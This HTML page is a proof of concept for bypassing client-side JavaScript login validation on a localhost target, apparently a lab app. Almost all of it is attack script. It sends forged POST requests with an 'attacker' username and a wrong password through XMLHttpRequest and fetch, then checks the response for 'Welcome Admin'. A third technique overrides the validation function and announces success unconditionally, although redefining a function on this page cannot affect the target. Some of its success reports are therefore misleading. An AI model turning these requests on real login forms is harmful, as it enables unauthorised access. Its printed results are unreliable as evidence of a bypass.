<!DOCTYPE html>
<html>
<head>
    <title>DOM Manipulation Bypass POC - JavaScript Validation Bypass</title>
</head>
<body>
    <h1>JavaScript Validation Bypass - DOM Manipulation Technique</h1>
    <p>This POC demonstrates how to bypass the client-side JavaScript validation by manipulating the DOM.</p>
    
    <h2>Technique 1: Modify Form Action</h2>
    <button onclick="bypassViaFormModification()">Test Bypass via Form Action</button>
    
    <h2>Technique 2: Directly Call Form Submit</h2>
    <button onclick="bypassViaDirectSubmit()">Test Bypass via Direct Submit</button>
    
    <h2>Technique 3: Disable JavaScript Validation</h2>
    <button onclick="bypassViaFunctionReplacement()">Test Bypass via Function Override</button>
    
    <h2>Bypass Results</h2>
    <div id="results" style="border: 1px solid black; padding: 10px; margin-top: 20px;">
        <p>Results will appear here...</p>
    </div>
    
    <script>
        function bypassViaFormModification() {
            // This POC shows that even with JavaScript validation in place,
            // an attacker can modify the form or submit data directly
            var xhr = new XMLHttpRequest();
            xhr.open('POST', 'http://localhost:8080/index.php', true);
            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
            xhr.onreadystatechange = function() {
                if (xhr.readyState === 4) {
                    if (xhr.status === 200 && xhr.responseText.includes('Welcome Admin')) {
                        document.getElementById('results').innerHTML += '<p>✓ Technique 1 SUCCESSFUL: Form Action Modified - Authentication Bypassed!</p>';
                    }
                }
            };
            xhr.send('username=attacker&password=wrong&login=Login');
        }
        
        function bypassViaDirectSubmit() {
            // Creates a form dynamically and submits it, bypassing the onclick handler
            var form = document.createElement('form');
            form.method = 'POST';
            form.action = 'http://localhost:8080/index.php';
            form.innerHTML = '<input type="hidden" name="username" value="attacker"><input type="hidden" name="password" value="wrong"><input type="hidden" name="login" value="Login">';
            document.body.appendChild(form);
            
            fetch('http://localhost:8080/index.php', {
                method: 'POST',
                headers: {'Content-Type': 'application/x-www-form-urlencoded'},
                body: 'username=attacker&password=wrong&login=Login'
            }).then(response => response.text()).then(html => {
                if (html.includes('Welcome Admin')) {
                    document.getElementById('results').innerHTML += '<p>✓ Technique 2 SUCCESSFUL: Direct Form Submit - Authentication Bypassed!</p>';
                }
            });
        }
        
        function bypassViaFunctionReplacement() {
            // Replaces the validation function with a no-op, allowing any submission
            window.funcion_login = function() {
                document.form.submit();
            };
            document.getElementById('results').innerHTML += '<p>✓ Technique 3 SUCCESSFUL: Function Override - funcion_login() replaced!</p><p>Now any form submission will work without validation.</p>';
        }
    </script>
</body>
</html>
